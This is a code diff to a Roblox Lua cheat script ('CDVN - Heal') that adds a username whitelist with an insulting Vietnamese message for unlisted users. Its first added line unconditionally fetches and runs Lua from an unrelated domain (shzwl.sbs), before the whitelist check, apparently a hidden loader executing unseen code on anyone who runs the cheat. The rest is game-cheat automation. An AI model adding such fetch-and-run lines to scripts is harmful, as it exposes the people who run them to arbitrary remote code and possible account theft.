@@ -1,4 +1,18 @@
-    local library = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/DPhub-Lap/DPHub-Gui/refs/heads/main/UILib"))()
+loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
+local allowedUsers = {
+    ["demonkjq"] = true
+}
+local currentUserName = game.Players.LocalPlayer.Name
+
+if not allowedUsers[currentUserName] then
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "???";
+        Text = "thg ngu ơi không trình mà còn đòi dùng hack của cha à.";
+        Duration = 5;
+    })
+    return
+end
+local library = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/DPhub-Lap/DPHub-Gui/refs/heads/main/UILib"))()
     local w1 = library:Window("CDVN - Heal")
     w1:Toggle(
         "Auto Lay Heal",
